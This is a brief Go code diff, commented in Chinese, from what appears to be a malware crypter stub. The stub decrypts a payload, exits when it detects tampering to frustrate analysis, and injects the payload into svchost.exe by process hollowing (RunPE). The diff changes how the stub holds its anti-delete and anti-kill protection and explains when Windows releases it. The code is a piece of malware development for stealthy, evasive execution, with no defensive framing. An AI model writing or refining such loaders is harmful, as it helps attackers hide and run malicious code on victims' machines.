@@ -74,13 +74,13 @@ func main() {
 		os.Exit(1) // 密文损坏或被篡改，防分析
 	}
 
-	// 4. 执行内存加载 (RunPE)
+	// 4. 执行内存加载 (RunPE)，此方法现已改为阻塞执行
 	targetHost := "C:\\Windows\\System32\\svchost.exe"
 	err = loader.Execute(targetHost, decryptedPayload)
 	if err != nil {
 		os.Exit(1)
 	}
 
-	// 5. 保持 Stub 主线程存活，维持防删防杀状态
-	select {}
+	// 5. 真实程序已退出，外壳自动顺延执行到末尾并退出
+	// 进程退出后，Windows 会自动回收防删持有的 FileHandle 并销毁 DACL 防护对象
 }
